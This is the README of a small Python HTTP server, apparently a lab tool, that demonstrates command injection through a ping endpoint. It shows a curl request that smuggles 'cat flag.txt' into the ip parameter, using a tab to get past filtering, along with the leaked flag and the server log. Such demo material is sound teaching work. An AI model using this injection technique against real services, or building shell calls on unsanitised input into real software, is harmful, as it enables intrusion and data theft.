# rce-endpoint
Simple python http server to demonstrate RCE vulnerabilities.

### Run
```
lomaha@rce-endpoint % python3 main.py -a=127.0.0.1 -p=80 -u=/ping -c='ping -c 1'
```
### Use
#### Client side:
```
lomaha@rce-endpoint % curl -G "http://127.0.0.1:80/ping?ip=8.8.8.8;cat%09flag.txt" 
b'PING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=111 time=7.668 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 7.668/7.668/7.668/0.000 ms\nLOMAHA{cwhf85wLOMAHA4375023}'
```
#### Server side:
```
Server started http://127.0.0.1:80
127.0.0.1 - - [25/Dec/2021 20:49:42] "GET /ping?ip=8.8.8.8;cat%09flag.txt HTTP/1.1" 200 -
Path: '/ping'
Query params: 'ip'
Quer value: '8.8.8.8;cat	flag.txt'

```